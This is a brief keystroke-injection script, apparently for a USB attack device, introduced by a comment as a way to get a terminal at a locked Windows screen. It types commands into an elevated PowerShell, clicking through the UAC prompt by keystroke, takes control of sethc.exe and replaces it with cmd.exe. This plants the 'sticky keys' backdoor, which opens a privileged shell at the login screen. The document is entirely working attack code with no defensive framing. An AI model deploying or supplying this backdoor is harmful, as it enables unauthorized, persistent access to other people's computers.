//When you press shift 5 times, instead of sticky keys popping up, this script makes it so the terminal come up allowing you to enter commands while locked out of the computer

layout('us');
press("GUI r");
delay(100);
type("powershell Start-Process powershell -Verb runAs\n")
delay(4000);
press("SHIFT TAB");
delay(100);
press("ENTER");
delay(2000);
type("$Acl = Get-Acl sethc.exe\n")
type("$Ar = New-Object  system.security.accesscontrol.filesystemaccessrule($env:UserName,\"FullControl\",\"Allow\")\n")
type("$Acl.SetAccessRule($Ar)\n")
type("Set-Acl sethc.exe $Acl\n")
type("xcopy sethc.exe sethc.exe.bak\n")
delay(200);
press("y")
delay(1000);
type("xcopy cmd.exe sethc.exe\n")
delay(200);
press("y")
delay(1000);
type("exit\n")
